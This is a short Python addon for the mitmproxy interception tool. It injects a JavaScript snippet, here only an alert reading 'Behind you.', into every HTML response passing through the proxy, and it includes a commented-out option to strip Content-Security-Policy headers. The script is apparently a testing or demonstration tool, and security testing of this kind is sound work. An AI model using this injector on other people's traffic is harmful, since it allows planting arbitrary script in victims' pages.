# Usage: mitmdump -s "js_injector.py src"
# (this script works best with --anticache)
from bs4 import BeautifulSoup
import mitmproxy

INJECTED_JS = \
"""
alert('Behind you.');
"""

def response(flow):
    """
    # To Allow CORS
    if "Content-Security-Policy" in flow.response.headers:
        del flow.response.headers["Content-Security-Policy"]
    """
    html = BeautifulSoup(flow.response.content, "lxml")
    if flow.response.headers and "Content-Type" in flow.response.headers:
        cthead = flow.response.headers["Content-Type"]
        if html.body and ('text/html' in flow.response.headers["Content-Type"]):
            script = html.new_tag("script", type='application/javascript')
            script.append(INJECTED_JS)
            html.body.insert(0, script)
            flow.response.text = str(html)
            mitmproxy.ctx.log("*************************** Filter Injected ***************************")
